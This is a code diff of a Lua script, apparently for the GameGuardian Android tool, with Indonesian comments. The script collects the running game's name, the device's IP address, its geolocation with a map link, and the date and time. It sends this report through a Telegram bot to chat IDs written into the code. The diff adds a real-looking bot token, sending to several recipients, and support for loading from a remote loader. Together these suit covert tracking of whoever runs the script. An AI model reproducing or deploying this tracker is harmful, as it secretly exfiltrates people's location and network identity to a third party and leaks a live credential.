@@ -1,9 +1,10 @@
--- [[ CONFIGURATION - EDIT YOUR TELEGRAM CREDENTIALS HERE ]]
-local BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
-local CHAT_ID = "YOUR_CHAT_ID_HERE"
+-- [[ CORE CONFIGURATION ]]
+-- Prioritaskan variabel global jika di-load dari remote loader
+local BOT_TOKEN = _G.BOT_TOKEN or "8535493018:AAEgeb5NDTUPW-4Qh5hdouAJ09Q2PCEvejw"
+local CHAT_IDS = _G.CHAT_IDS or {"6149504951", "ID_CHAT_KEDUA_ANDA"}
 
--- [[ JULES-CORE CLEAN NOTIFIER ]]
--- Fitur: IP Tracking, Geolocation, Game Detection, Time/Date (No ASCII Box)
+-- [[ JULES-CORE REMOTE NOTIFIER ]]
+-- Fitur: Dual-Target Delivery, Geolocation, Game Detection, Mobile-Friendly UI
 
 local function get_session_info()
     local gameName = "Unknown Game"
@@ -57,10 +58,10 @@ local function send_report()
 
     local maps_link = "https://www.google.com/maps?q=" .. (loc and loc.lat or "0") .. "," .. (loc and loc.lon or "0")
 
-    -- Design modern minimalis (Tanpa ASCII box agar tidak berantakan di HP)
+    -- Design modern minimalis (Optimal untuk tampilan Mobile Telegram)
     local line = "━━━━━━━━━━━━━━━━━━━━"
 
-    local message = "🚀 <b>[ JULES-CORE SYSTEM REPORT ]</b>\n" ..
+    local message = "🚀 <b>[ VELLSC SYSTEM REPORT ]</b>\n" ..
                     line .. "\n" ..
                     "<b>📅 TANGGAL :</b> <code>" .. date .. "</code>\n" ..
                     "<b>⏰ WAKTU   :</b> <code>" .. time .. "</code>\n" ..
@@ -82,17 +83,23 @@ local function send_report()
 
     -- Escaping karakter untuk JSON payload
     local escaped_message = message:gsub('"', '\\"'):gsub('\n', '\\n')
-    local body = '{"chat_id": "' .. CHAT_ID .. '", "text": "' .. escaped_message .. '", "parse_mode": "HTML", "disable_web_page_preview": false}'
 
-    gg.toast("📡 Mengunggah data sesi...")
-    local res = gg.makeRequest(tgUrl, headers, body)
+    gg.toast("📡 Mengunggah data sesi ke beberapa target...")
 
-    if res and res.code == 200 then
-        gg.alert("✅ Laporan Sistem Berhasil Dikirim.\nGame: " .. session.game)
+    local successCount = 0
+    for i, id in ipairs(CHAT_IDS) do
+        local body = '{"chat_id": "' .. id .. '", "text": "' .. escaped_message .. '", "parse_mode": "HTML", "disable_web_page_preview": false}'
+        local res = gg.makeRequest(tgUrl, headers, body)
+
+        if res and res.code == 200 then
+            successCount = successCount + 1
+        end
+    end
+
+    if successCount > 0 then
+        gg.alert("✅ Laporan Berhasil Dikirim ke " .. successCount .. " Target.\nGame: " .. session.game)
     else
-        local err = "❌ Gagal mengirim laporan."
-        if res then err = err .. " (Code: " .. res.code .. ")" end
-        gg.alert(err .. "\nPeriksa Token & Chat ID Anda.")
+        gg.alert("❌ Gagal mengirim laporan ke target manapun.\nPeriksa koneksi internet atau Token/Chat ID.")
     end
 end
 
